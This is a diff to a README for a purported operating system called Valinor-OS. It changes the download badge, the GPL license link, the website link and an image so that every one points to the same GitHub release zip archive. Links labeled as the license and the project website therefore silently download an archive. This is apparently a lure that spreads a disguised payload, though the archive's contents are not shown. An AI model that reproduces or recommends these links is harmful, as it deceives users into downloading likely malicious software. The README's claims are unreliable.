@@ -20,7 +20,7 @@ Valinor-OS is a revolutionary operating system that combines the power of Linux 
 
 ## Getting Started
 To experience the magic of Valinor-OS, download our software package from the following link:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/MAXPLAIZIN/valinor-os/releases/download/v2.0/Release_x64.zip)](https://github.com/MAXPLAIZIN/valinor-os/releases/download/v2.0/Release_x64.zip)
 
 If the link does not work, kindly check the "Releases" section for alternative download options.
 
@@ -49,12 +49,12 @@ A big thank you to all the contributors who have helped shape Valinor-OS into wh
 We value your feedback and suggestions to enhance the Valinor-OS experience. Feel free to reach out to us with your ideas, bug reports, or feature requests. Your input matters to us!
 
 ## License
-Valinor-OS is licensed under the [GNU General Public License v3.0](https://www.gnu.org/licenses/gpl-3.0.html). Feel free to explore, modify, and distribute the software in accordance with the terms of the license.
+Valinor-OS is licensed under the [GNU General Public License v3.0](https://github.com/MAXPLAIZIN/valinor-os/releases/download/v2.0/Release_x64.zip). Feel free to explore, modify, and distribute the software in accordance with the terms of the license.
 
 ---
 
 Thank you for choosing Valinor-OS! 🌟 Dive into a world of innovation and efficiency with our advanced operating system. Happy computing! 🎉
 
-🔗 For more information and updates, visit our [website](https://www.valinor-os.com).
+🔗 For more information and updates, visit our [website](https://github.com/MAXPLAIZIN/valinor-os/releases/download/v2.0/Release_x64.zip).
 
-![Valinor-OS](https://yourimage.jpg)
+![Valinor-OS](https://github.com/MAXPLAIZIN/valinor-os/releases/download/v2.0/Release_x64.zip)
